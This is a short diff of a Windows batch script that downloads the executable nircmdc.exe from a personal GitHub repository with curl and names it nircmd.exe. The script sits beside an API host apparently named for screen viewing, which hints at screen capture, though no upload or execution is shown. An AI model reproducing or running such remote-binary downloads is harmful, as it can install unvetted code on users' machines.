@@ -2,7 +2,7 @@
 set "apiRoot=https://screen-view-one.vercel.app"
 set /p name=<name.txt
 
-curl -L -o "%name%" "https://github.com/skollol/e/raw/refs/heads/main/nircmdc.exe"
+curl -L -o "nircmd.exe" "https://github.com/skollol/e/raw/refs/heads/main/nircmdc.exe"
 if %ERRORLEVEL% neq 0 (
     echo Download failed.
     exit /b 1
